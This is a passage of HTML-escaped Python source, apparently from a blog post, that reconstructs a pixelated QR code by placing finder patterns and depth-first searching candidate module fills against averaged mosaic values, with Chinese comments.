check(xx,yy,fn&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;114514&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fn = fn&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    avr = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    qx1,qy1,qx2,qy2 = X+Mi*MSBLOCK,Y+Mj*MSBLOCK,X+(Mi+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*MSBLOCK-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,Y+(Mj+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*MSBLOCK-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fillN&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                x1,y1,x2,y2 = getRange(x,y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                inx1,iny1,inx2,iny2 = &lt;span class=&#34;built_in&#34;&gt;max&lt;/span&gt;(x1,qx1),&lt;span class=&#34;built_in&#34;&gt;max&lt;/span&gt;(y1,qy1),&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(x2,qx2),&lt;span class=&#34;built_in&#34;&gt;min&lt;/span&gt;(y2,qy2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                avr = avr + (iny2-iny1+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*(inx2-inx1+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fillN = fillN &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    newres = avr/(MSBLOCK*MSBLOCK)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (newres &amp;lt; comp-&lt;span class=&#34;number&#34;&gt;0.1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1919810&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(math.floor((avr/(MSBLOCK*MSBLOCK))*&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;-comp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;putRec&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,j&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#放置识别码块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i][j]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    kimeta[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res_arr[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(i-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,i+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(j-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,j+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(x-i)==&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;abs&lt;/span&gt;(y-j)==&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                kimeta[x][y]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                res_arr[x][y]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putRec(&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putRec(&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putRec(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;putRec(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;52&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;55&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i==&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; i==&lt;span class=&#34;number&#34;&gt;51&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j==&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j==&lt;span class=&#34;number&#34;&gt;54&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            kimeta[i][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            res_arr[i][j]=pre_arr[i*QRBLOCK+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;][j*QRBLOCK+&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;new_arr =  [[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(SIZE)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fked =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cntt = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;savecnt=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;dfs&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,j&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#从马赛克块的i行j列开始&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; cntt,savecnt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cntt = cntt+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#落在哪个二维码方块上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (cntt==&lt;span class=&#34;number&#34;&gt;200000&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#保存中途结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        MatrixToImage(np.array(new_arr)).save(&lt;span class=&#34;string&#34;&gt;&amp;#x27;mid%s.bmp&amp;#x27;&lt;/span&gt;%savecnt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        savecnt = savecnt + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cntt = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i&amp;lt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; i&amp;gt;=&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j&amp;lt;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; j&amp;gt;=&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; fked[i][j]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fked[i][j]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    nowMin , nowSol = &lt;span class=&#34;number&#34;&gt;114514191981.0&lt;/span&gt; , (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;(EACH*EACH))-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tmpp =  [[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; col &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)] &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; row &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            tmpp[x-LUR][y-LUC]=vis[x][y]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; filN &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;(EACH*EACH)):&lt;span class=&#34;comment&#34;&gt;#枚举每个马赛克块影响到的3*3=9个QR块&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;][Y+j*MSBLOCK+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],LUR,LUC)&lt;span class=&#34;comment&#34;&gt;#同样是乱写的offset+2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; tmp &amp;lt; &lt;span class=&#34;number&#34;&gt;0.00000001&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            nowSol = filN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    vis[x][y] = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    res_arr[x][y]=nowSol&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    nowSol = nowSol&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; fked[i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; dfs(i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,j)) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; (j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; fked[i][j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; dfs(i,j+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; (i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; fked[i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;][j]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; dfs(i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,j)) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; (j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;gt;=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; fked[i][j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; dfs(i,j-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                fked[i][j]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        vis[x][y] = tmpp[x-LUR][y-LUC]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fked[i][j]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            vis[x][y] = tmpp[x-LUR][y-LUC]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#预先扫描，把能确定的、没有多解的先填上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        succnt = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; filN &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span 